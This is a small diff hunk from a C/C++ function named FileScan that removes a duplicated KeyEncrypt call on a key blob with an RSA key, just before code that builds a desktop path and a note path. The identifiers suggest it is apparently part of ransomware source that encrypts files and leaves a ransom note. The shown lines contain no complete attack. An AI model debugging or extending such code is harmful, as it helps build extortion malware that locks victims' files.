@@ -152,8 +152,6 @@ void FileScan(bool decryptMode) {
     if (!decryptMode) {
         KeyEncrypt(&keyBlob, hRsaKey);
 
-        KeyEncrypt(&keyBlob, hRsaKey);
-
         char desktopPath[MAX_PATH];
         char notePath[MAX_PATH];
         HANDLE hNote;
